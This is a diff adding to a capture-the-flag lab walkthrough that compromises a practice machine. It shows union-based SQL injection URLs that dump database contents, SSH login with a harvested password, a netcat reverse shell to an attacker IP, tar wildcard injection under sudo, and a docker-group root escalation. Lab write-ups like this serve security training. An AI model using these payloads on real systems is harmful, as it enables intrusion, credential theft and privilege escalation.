@@ -181,16 +181,204 @@ http://10.10.243.219/admin?user=1 order by 1-- -
 
 It responded the same, than I'll increase the column numbers until the website will response differently:
 
+```url
+http://10.10.243.219/admin?user=1 order by 2-- -
+http://10.10.243.219/admin?user=1 order by 3-- -
+http://10.10.243.219/admin?user=1 order by 4-- -
+http://10.10.243.219/admin?user=1 order by 5-- -
 ```
 
+5 columns make error so the conclusion is the table has 4 columns:
+
+![image](https://user-images.githubusercontent.com/114166939/232224802-6d24f723-e9b9-4ae0-9f13-2ea59de55475.png)
+
+Let's find out if one of them is printable on the page with 'union select' sql command:
+(I'll add impossible value to the user parameter so it'll print only what I choose to print)
+```url
+http://10.10.243.219/admin?user=-999 union select 1,2,3,4-- -
 ```
 
+![image](https://user-images.githubusercontent.com/114166939/232225067-efa9a623-c4a5-4e86-8d25-47a85a4b6668.png)
+
+The first and second values are printable!
+
+I'lll use the default database "information_schema" to get all details:
+
+For start I'm going to ask the database what schemas are in there with the command:
+```url
+http://10.10.243.219/admin?user=-999 union select group_concat(schema_name),2,3,4 from information_schema.schemata-- -
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232225532-dc3651e4-0472-4037-a351-e4938aa20d98.png)
+
+I want to see what tables "marketplace" schema have:
+
+```url
+http://10.10.243.219/admin?user=-999 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='marketplace'-- -
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232225654-986f46cc-6f2d-45d9-ace6-a65722491897.png)
+
+Now, let's check what's inside "messages" table:
+
+```url
+http://10.10.243.219/admin?user=-999 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema='marketplace' and table_name='messages'-- -
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232225759-2334b75d-5ec9-4459-8ab3-5a95fa5a5821.png)
+
+I'll dump the information in "message_content" column:
+
+```url
+http://10.10.243.219/admin?user=-999 union select group_concat(message_content),2,3,4 from marketplace.messages-- -
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232226217-d26b5422-acb2-411a-bcb5-353e6e43ae3a.png)
 
 
+Now I can login to the SSH service with the password I got.
+There are only 4 users in the system, one of them is mine, so I can automate it with hydra or check it manually.
+
+Because it's only 3 users, did it manually and found out that the user which got this password is "jake".
+I'll login as jake via SSH:
+
+```bash
+ssh jake@10.10.243.219
+```
+
+I have a shell as "jake" user!
+
+![image](https://user-images.githubusercontent.com/114166939/232226349-f5c1d98d-abac-4bca-821b-b2adcc33979e.png)
+
+First thing I'll do is to get the second flag, "user.txt" file, which locate in the home directory of "jake" user:
+
+![image](https://user-images.githubusercontent.com/114166939/232226711-4e583a0c-9549-4ea4-b15e-41bd8e85cfb6.png)
+
+Second thing to check is what groups this user belongs and what permissions he has:
+```bash
+id
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232226534-c41a0f5d-1666-4f1c-b31b-65820e7303ae.png)
+
+```bash
+sudo -l
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232226516-e00e4895-5b5c-4dbd-8025-e361dfcaeb87.png)
+
+The only thing this user can do as "michael" user is to run "/opt/backups/backup.sh" bash file.
+I'll go this location and cat this file:
+
+```bash
+cd /opt/backups/ && cat backup.sh
+```
+
+![image](https://user-images.githubusercontent.com/114166939/232226894-10ca44ec-8427-46f9-8638-11d47f4ab6fd.png)
+
+The content of this bash file means that it will take all the content of the "/opt/backups/" and archive it to the "backup.tar" archive.
 
 
+![image](https://user-images.githubusercontent.com/114166939/232227008-81441152-846b-47ef-843d-1bd9defa3cf7.png)
+
+The "backup.sh" file owned by "michael" user and the "backup.tar" owned by "jake" user.
+There is a known vulnerability with the "tar" command and wildcard which also mentioned in GTFOBins ("https://gtfobins.github.io/") under "tar -> Sudo".
+
+![image](https://user-images.githubusercontent.com/114166939/232227193-bfd17a2d-ee06-4751-911d-ec6e1d618235.png)
+
+I'll use this technique to exploit this machine and get access to "michael" user.
+For this purpose I'll use this article "https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" under "Tar Wildcard Injection (1st method)" and will modify for my own needs:
+
+I'll start by generate exploit for the reverse shell using "msfvenom" tool:
+```bash
+msfvenom -p cmd/unix/reverse_netcat lhost=[MY-IP] lport=6666 R
+```
+
+Got the following results:
+```bash
+mkfifo /tmp/husncp; nc [MY-IP] 6666 0</tmp/husncp | /bin/sh >/tmp/husncp 2>&1; rm /tmp/husncp
+```
+
+Next, I'll echo this command inside a file called "shell.sh":
+```bash
+echo "mkfifo /tmp/lzeh; nc [MY-IP] 6666 0</tmp/lzeh | /bin/sh >/tmp/lzeh 2>&1; rm /tmp/lzeh" > shell.sh
+```
+
+Now, the following two commands:
+```bash
+echo "" > "--checkpoint-action=exec=sh shell.sh" && echo "" > --checkpoint=1
+```
+
+All left to do is:
+
+Give "shell.sh" and "backup.tar" all permissions to avoid errors:
+```bash
+chmod 777 shell.sh && chmod 777 backup.tar
+```
+
+![image](https://user-images.githubusercontent.com/114166939/232228562-a7e09ea8-a673-4754-b6ed-a24af9bfc997.png)
+
+Establish netcat listener on the attacker machine:
+```bash
+nc -lnvp 6666
+```
+
+And run the the "backup.sh" bash script as "michael" user by using the command:
+```bash
+sudo -u michael ./backup.sh
+```
+
+Got a shell as "michael" user!
+
+![image](https://user-images.githubusercontent.com/114166939/232228748-3020a9de-dc7a-43cf-bd13-ab527a7f1501.png)
+
+First, I'll upgarde this sh shell with python to get a bash shell:
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+As a user I don't know, I'll check again what groups and what premissions this user has:
+```bash
+id
+```
+
+Results:
+
+![image](https://user-images.githubusercontent.com/114166939/232228827-e4e23072-e09e-436d-ab8e-f5c2b3f560c4.png)
 
 
+```bash
+sudo -l
+```
 
+No results because password needed.
 
+I see this user is a member in "docker" group!
+Quick peek to GTFOBins under "docker -> Shell" will show simple command to get a privilege escalation and shell as a root:
 
+![image](https://user-images.githubusercontent.com/114166939/232229187-a8b1b2cc-d944-467e-8c2b-b6bc9f099a06.png)
+
+Let's use this command on michael's shell:
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+Got the root user!
+
+![image](https://user-images.githubusercontent.com/114166939/232229647-ce1a4a28-6755-4fc3-9825-0554db2c471f.png)
+
+Now all left to do is to print the final flag, "root.txt" file, which located in the root home directory:
+
+![image](https://user-images.githubusercontent.com/114166939/232229786-bd76972c-731d-4578-8513-b87b1a28f995.png)
